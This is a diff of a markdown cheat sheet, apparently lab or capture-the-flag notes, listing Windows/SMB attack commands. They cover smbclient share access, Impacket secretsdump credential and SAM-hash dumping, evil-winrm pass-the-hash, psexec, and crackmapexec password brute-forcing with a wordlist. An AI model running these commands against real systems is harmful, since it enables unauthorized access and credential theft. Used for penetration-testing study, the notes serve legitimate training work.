@@ -20,7 +20,7 @@
 and crack it
 
 ## login to smbclient if you have creds
-`smbclient -L //[IP] --user=[user]`
+`smbclient -L //[IP] --user=[user] --password [password]`
 
 ## access shares if you have creds
 `smbclient //[IP]/[sharename] --user=[user]`
@@ -36,7 +36,7 @@ or
 `python3 ~/scripts/impacket/examples/secretsdump.py [options you want] [user]:[password]@[IP]`
 
 ## got NTLM hash? got password? got user? evil-winrm time
-`evil-winrm -i [IP] -u [user] -H [NTLM hash]`
+`evil-winrm -i [IP] -u [user] -H [NT hash]`
 or just use the password if you got one
 
 or just psexec
@@ -46,6 +46,7 @@ or just psexec
 ## Try Bruteforce SMB with crackmapexec
 `crackmapexec smb <MACHINE-IP> -u <username> -p <wordlist>`
 ex: `crackmapexec smb 10.10.153.204 -u Jareth -p ~/wordlists/rockyou.txt`
+
 
 ## Dumping LM and NTLM when we have system.bak and sam.bak
 `python3 ~/scripts/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL -outputfile hashes.txt`
